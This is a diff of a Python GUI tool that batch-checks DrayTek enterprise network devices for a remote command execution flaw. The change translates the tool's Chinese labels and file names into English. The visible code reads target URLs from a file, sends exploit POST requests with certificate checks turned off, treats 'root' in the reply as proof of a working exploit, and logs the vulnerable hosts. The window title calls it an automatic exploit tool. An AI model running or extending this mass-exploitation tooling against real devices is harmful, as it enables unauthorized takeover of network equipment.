@@ -16,25 +16,25 @@ def vigor_rce_exp(url):
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
         if "root" in response.text and response.status_code == 200:
-            vigor_rce_text.insert(END, "-------------------------------\n【！！！！！！】存在漏洞的url：" + url + "\n-------------------------------\n")
+            vigor_rce_text.insert(END, "-------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + "\n-------------------------------\n")
             vigor_rce_text.see(END)
-            with open ("存在DrayTek企业网络设备远程命令执行漏洞的url.txt", 'a+') as f:
+            with open ("[exists]DrayTek_network_devices_rce_url.txt", 'a+') as f:
                 f.write(url + "\n")
         else:
-            vigor_rce_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
+            vigor_rce_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
             vigor_rce_text.see(END)
     except Exception as err:
-        vigor_rce_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        vigor_rce_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         vigor_rce_text.see(END)
 def get_vigor_rce_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def vigor_rce_gui():
     vigor_rce = Toplevel()
     vigor_rce.geometry("1035x455")
-    vigor_rce.title("DrayTek企业网络设备 远程命令执行一把梭")
+    vigor_rce.title("DrayTek Enterprise Network Equipment RCE [auto-muti-exp]")
     vigor_rce.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     vigor_rce.tk.call('wm', 'iconphoto', vigor_rce._w, logo)
